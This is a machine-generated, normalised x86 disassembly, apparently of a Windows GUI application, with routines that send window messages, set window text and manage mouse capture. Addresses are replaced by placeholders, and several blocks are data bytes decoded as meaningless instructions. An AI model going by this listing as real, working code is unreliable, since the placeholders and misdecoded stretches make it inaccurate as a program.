mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_4293c8
pop ebx
retn
sub_4293b8
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_429491
jmp sub_4039e4
sub_429498
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4294e0
push ebx
mov ebx eax
mov eax ebx
call sub_443ec4
mov eax ebx
call sub_429080
pop ebx
retn
sub_4294f4
push ebx
mov ebx eax
mov eax ebx
call sub_4343c4
mov eax ebx
call sub_429080
pop ebx
retn
sub_429508
mov al 0x1
retn
sub_42950c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4295bc
mov ecx [ edx ]
sub [ eax ] ecx
mov ecx [ edx + 0x4 ]
sub [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
add [ eax + 0x8 ] ecx
mov edx [ edx + 0xc ]
add [ eax + 0xc ] edx
retn
sub_429718
push ebx
mov ebx edx
mov edx ebx
call sub_4417f4
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_42a295
jmp sub_4039e4
sub_42a6b1
jmp sub_4039e4
sub_42a6b8
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a6c4
cmp edx [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] edx
sub_42a6d4
cmp dl [ eax + 0x234 ]
je r-xdata
retn
mov [ eax + 0x234 ] dl
sub_42a6e4
retn
sub_42afcc
call sub_42afdc
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
retn
sub_42b11b
jmp sub_4039e4
sub_42b5dc
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_42b62c
xor edx edx
mov ecx [ eax + 0x22c ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_42b648
push esi
mov esi eax
mov eax [ esi + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42b8dd
jmp sub_4039e4
sub_42b915
jmp sub_4039e4
sub_42bca4
jmp sub_4039e4
sub_42bcab
pop ebp
retn
sub_42bcb0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d68
mov eax [ r-xdata ]
call sub_4132b0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
sub_42bd05
jmp sub_4039e4
sub_42bd0c
pop ebp
retn
sub_42bd10
sub [ rw-data ] 0x1
retn
sub_42bde8
jmp sub_4039e4
sub_42bdef
pop ecx
pop ebp
retn
sub_42bdf4
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_42bf2a
jmp sub_4039e4
sub_42bf31
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bfda
jmp sub_4039e4
sub_42c040
jmp sub_4039e4
sub_42c047
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c0a5
jmp sub_4039e4
sub_42c0ac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c191
jmp sub_4039e4
sub_42c198
pop ebx
mov esp ebp
pop ebp
retn
sub_42c215
jmp sub_4039e4
sub_42c21c
pop ebx
mov esp ebp
pop ebp
retn
sub_42c2ba
jmp sub_403730
sub_42c351
jmp sub_4039e4
sub_42c358
pop ebp
retn
sub_42c35c
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42c3d8
retn
sub_42c3d9
jmp sub_4039e4
j_sub_42c3d8
jmp sub_42c3d8
sub_42c3e0
pop ebp
retn
sub_42c3e4
sub [ rw-data ] 0x1
retn
sub_42c3ed
retn
sub_42d0ee
jmp sub_4039e4
sub_42d0f5
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d494
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_42dc17
jmp sub_4039e4
sub_42dc53
jmp sub_4039e4
sub_42e850
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404004
retn
sub_42e85e
jmp sub_4039e4
j_sub_42e850
jmp sub_42e850
sub_42e865
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42eaec
call sub_43f6bc
retn
sub_42eaf4
push ebx
mov ebx eax
mov eax ebx
call sub_42eb10
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_42eb08
mov eax [ r-xdata ]
retn
sub_42eb10
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_42eb1c
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_42d604
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_42eb34
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_42eb6c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ec1c
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ec38
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_42eb74
sub_42ec4c
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ec68
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ec88
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ece0
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_42eb74
sub_42ecf4
push esi
mov esi eax
mov eax esi
call sub_43f86c
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_40348c
sub_42ee41
jmp sub_4039e4
sub_42ee48
pop edi
pop esi
pop ecx
pop ebp
retn
sub_42ee50
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ee58
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ee60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_42d590
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_42d6a4
pop esi
pop ebx
retn
sub_42f1a8
push ebx
mov ebx edx
mov edx ebx
call sub_435664
or [ ebx + 0x4 ] 0xb
pop ebx
retn
sub_42f1b8
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_43e688
sub_42f238
mov edx [ edx + 0x8 ]
mov ecx [ eax + 0x48 ]
mov [ edx + 0xc ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0x10 ] eax
retn
sub_42f248
mov edx [ edx + 0x8 ]
call sub_42f254
retn
sub_42f66e
jmp sub_4039e4
sub_42f675
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f67c
push ebx
mov ebx eax
mov eax ebx
call sub_443ec4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f690
push ebx
mov ebx eax
mov eax ebx
call sub_443e54
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f6a4
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0x201
call sub_43f334
retn
sub_42f6b8
push ebx
mov ebx eax
mov eax ebx
call sub_42f6ec
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_42f6cc
push ebx
mov ebx eax
mov eax [ ebx + 0x21c ]
call sub_42d604
mov [ ebx + 0x22d ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f6ec
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x4 ]
retn
sub_42f6f8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f700
push ebx
mov ebx eax
mov eax ebx
call sub_42f8b0
test al al
sete al
pop ebx
retn
sub_42f714
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f824
jmp sub_4039e4
sub_42f82b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f89f
jmp sub_4039e4
sub_42f8a6
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f91c
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f930
mov eax [ eax + 0x21c ]
mov al [ eax + 0x20 ]
retn
sub_42f968
cmp edx [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f97c
cmp edx [ eax + 0x228 ]
je r-xdata
retn
cmp edx 0xffffffff
jl r-xdata
mov [ eax + 0x228 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42faa8
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403290
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42fbdc
jmp sub_4039e4
sub_42fbe3
pop ebp
retn
sub_42fbe8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42fb34
call sub_403db4
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402cac
sub_42fc35
jmp sub_4039e4
sub_42fc3c
pop ebp
retn
sub_42fc40
sub [ rw-data ] 0x1
retn
sub_42fc9c
jmp sub_4039e4
sub_42fca3
pop ebp
retn
sub_42fca8
sub [ rw-data ] 0x1
retn
sub_42fd04
jmp sub_4039e4
sub_42fd0b
pop ebp
retn
sub_42fd10
sub [ rw-data ] 0x1
retn
sub_42fd71
jmp sub_4039e4
sub_42fd78
pop ebp
retn
sub_42fd7c
sub [ rw-data ] 0x1
retn
sub_42fdc8
jmp sub_4039e4
sub_42fdcf
pop ebp
retn
sub_42fdd4
sub [ rw-data ] 0x1
retn
sub_42fe01
jmp sub_4039e4
sub_42fe08
pop ebp
retn
sub_42fe0c
sub [ rw-data ] 0x1
retn
sub_42feb4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bce0
mov [ rw-data ] eax
sub_42fee9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42ff00
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42ff83
jmp sub_4039e4
sub_42ff8a
pop ebp
retn
sub_42ff8c
sub [ rw-data ] 0x1
retn
sub_42fffb
jmp [ edi ]
sub_43029c
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4302b4
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_4302f8
push ebx
mov ebx eax
mov eax ebx
call sub_430b54
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_430b43
jmp sub_4039e4
sub_430b54
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_426448
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_4302c8
sub_430bab
jmp sub_4039e4
sub_430bb2
pop ebp
retn
sub_430bb4
sub [ rw-data ] 0x1
retn
sub_433f3f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x275d172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_4342fa
jmp sub_4039e4
sub_434301
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434386
jmp sub_4039e4
sub_43438d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434394
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_441228
pop ebx
retn
sub_4343a8
push ebx
mov ebx eax
mov eax ebx
call sub_443f80
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_441228
pop ebx
retn
sub_4343c4
push ebx
mov ebx eax
mov eax ebx
call sub_442f54
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_434470
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e14c
pop esi
pop ebx
retn
sub_4345da
jmp sub_4039e4
sub_4345e1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4346f0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44023c
mov eax ebx
mov si 0xffc7
call sub_40348c
pop esi
pop ebx
retn
sub_4347dc
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4347f8
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_40348c
sub_434814
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_434820
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4194fc
sub_434834
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434894
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434908
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_40348c
pop esi
pop ebx
retn
sub_434924
push esi
mov esi eax
mov eax esi
call sub_43fd48
mov eax esi
mov si 0xffc7
call sub_40348c
pop esi
retn
sub_4349c9
jmp sub_4039e4
sub_4349d0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4349d8
push ebx
mov ebx eax
mov eax ebx
call sub_43feac
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_4349fc
push ebx
mov ebx eax
mov eax ebx
call sub_43fec4
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_434ae8
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_435010
sub_434afc
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_435010
mov eax ebx
call sub_441f08
sub_434c98
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_444968
push eax
call SetWindowTextA
pop ebx
retn
sub_434cb4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_434cd0
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_434d76
jmp sub_4039e4
sub_434d7d
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434e16
jmp sub_4039e4
sub_434f8f
jmp sub_4039e4
sub_434ff4
push ebx
mov ebx eax
mov eax ebx
call sub_434b50
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_441d04
pop ebx
retn
sub_4350f4
push ebx
mov ebx eax
mov eax ebx
call sub_43dd58
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4351ec
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_40348c
sub_43534e
jmp sub_4039e4
sub_4353f8
mov eax [ r-xdata ]
retn
sub_435400
xor eax eax
retn
sub_435424
retn
sub_43553c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_441f08
sub_4355b4
push ebx
mov ebx eax
mov eax ebx
call sub_4553f0
test eax eax
je r-xdata
mov eax ebx
call sub_43f6bc
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_4355d8
xor eax eax
retn
sub_43569f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3d89173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4356b8
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_40348c
sub_4357a9
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_4357b2
jmp sub_4039e4
j_sub_4357a9
jmp sub_4357a9
sub_4357b9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4358ec
mov al [ eax + 0x211 ]
retn
sub_435920
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_441f08
sub_435b00
call sub_441f08
retn
sub_435b7d
jmp sub_4039e4
sub_435b84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435bbc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_435c9c
jmp sub_4039e4
sub_435ca3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435d2f
jmp sub_4039e4
sub_435d36
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435e75
jmp sub_4039e4
sub_435e7c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435f11
jmp sub_4039e4
sub_435f18
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435f20
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_40348c
pop esi
retn
sub_43605e
jmp sub_4039e4
sub_436080
jmp sub_4039e4
sub_436087
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436090
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_40348c
pop esi
retn
sub_4361fa
jmp sub_4039e4
sub_436217
jmp sub_4039e4
sub_43621e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4363c1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
sub_4363cf
jmp sub_4039e4
j_sub_4363c1
jmp sub_4363c1
sub_4363d6
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436424
push esi
mov si 0xffb1
call sub_40348c
pop esi
retn
sub_436430
push esi
mov si 0xffb0
call sub_40348c
pop esi
retn
sub_436484
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4365ef
jmp sub_4039e4
sub_4365f6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436740
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_436764
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_4367cc
cmp dl [ eax + 0x23b ]
je r-xdata
retn
mov [ eax + 0x23b ] dl
call sub_441f08
sub_43684c
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_441f08
sub_436864
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_441f08
sub_436880
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_441f08
sub_436994
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_441f08
sub_4369f4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_436ab8
jmp sub_4039e4
sub_436abf
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436b5a
jmp sub_4039e4
sub_436b61
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436b68
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_441f08
sub_4371a4
push ebx
mov ebx eax
mov eax ebx
call sub_442f54
mov eax ebx
call sub_43666c
pop ebx
retn
sub_437324
jmp sub_4039e4
sub_43732b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_437334
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_437748
jmp sub_4039e4
sub_43774f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43782c
jmp sub_4039e4
sub_437833
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43783c
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_4378a8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x193
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_437915
jmp sub_4039e4
sub_43791c
pop ebp
retn
sub_437920
sub [ rw-data ] 0x1
retn
sub_437a7d
jmp sub_4039e4
sub_437a84
pop ebp
retn
sub_437a88
sub [ rw-data ] 0x1
retn
sub_437a90
inc esi
inc edi
add cl bh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_438308
sub_437aa1
add eax 0xffffffe0
jmp sub_438088
sub_437ab9
add eax 0xffffffe0
jmp sub_438278
sub_437ac1
add eax 0xffffffe0
jmp sub_437d34
sub_437ac9
add eax 0xffffffe0
jmp sub_437d48
sub_437ad1
add eax 0xffffffe0
jmp sub_437dc0
sub_437ad9
add eax 0xffffffe0
jmp sub_437e64
sub_437ae1
add eax 0xffffffe0
jmp sub_437e68
sub_437ae9
add eax 0xffffffe0
jmp sub_437ef0
sub_437af1
add eax 0xffffffe0
jmp sub_438038
sub_437af9
add eax 0xffffffe0
jmp sub_43803c
sub_437b01
add eax 0xffffffe0
jmp sub_438058
sub_437b13
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405720
sub_437b1d
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405734
sub_437cf1
jmp sub_4039e4
sub_437cf8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437d34
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_404034
pop ebx
retn
sub_437daf
jmp sub_4039e4
sub_437db6
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437e48
jmp sub_4039e4
sub_437e4f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437e64
mov al 0x1
retn
sub_437ee3
jmp sub_4039e4
sub_437eea
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_437fe8
jmp sub_4039e4
sub_437fef
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438038
mov [ eax + 0xc ] edx
retn
sub_43803c
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_4380e0
jmp sub_4039e4
sub_4380e7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4381e6
jmp sub_4039e4
sub_4381ed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438266
jmp sub_4039e4
sub_43826d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4382f8
jmp sub_4039e4
sub_4382ff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4383f3
jmp sub_4039e4
sub_4383fa
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4384bc
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_438408
call EnumWindows
retn
sub_43854e
jmp sub_4039e4
sub_438555
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_438560
xor eax eax
retn
sub_438659
jmp sub_4039e4
sub_438660
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43874a
jmp sub_4039e4
sub_438751
pop ebp
retn
sub_4387a6
jmp sub_4039e4
sub_4387ad
pop ebp
retn
sub_4392aa
adc [ eax ] al
hlt
sub_4397f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_439930
jmp r-xdata
sub_439932
0xe8ffe9ff 0xe7ff
sub_439939
jmp esi
sub_43a9f1
add eax 0xffffff8c
jmp sub_446ff4
sub_43a9f9
add eax 0xffffff8c
jmp sub_446ff8
sub_43aa01
add eax 0xffffff8c
jmp sub_4470e4
sub_43aa09
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43aa16
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43aa23
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43aa30
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43aa3d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43aa4a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43aa57
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43aa64
add eax 0xffffff8c
jmp sub_448754
sub_43aa76
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405720
sub_43aa80
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405734
sub_43aed8
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43b1eb
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413524
retn
sub_43b208
push 0x15
mov ecx rw-data
call sub_4134e4
retn
sub_43b2f4
call GetCapture
call sub_43afd8
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43b558
push ebx
push eax
push sub_43b6dc
call sub_41a578
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43b570
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43b5a0
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41a62c
pop ebx
retn
sub_43b67e
jmp sub_403730
sub_43b6b0
xor eax eax
retn
sub_43b6b4
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43b6cc
retn
sub_43b6d0
mov eax [ rw-data ]
retn
sub_43b6d8
retn
sub_43b706
jmp sub_403730
sub_43b70b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e194
call sub_403a98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
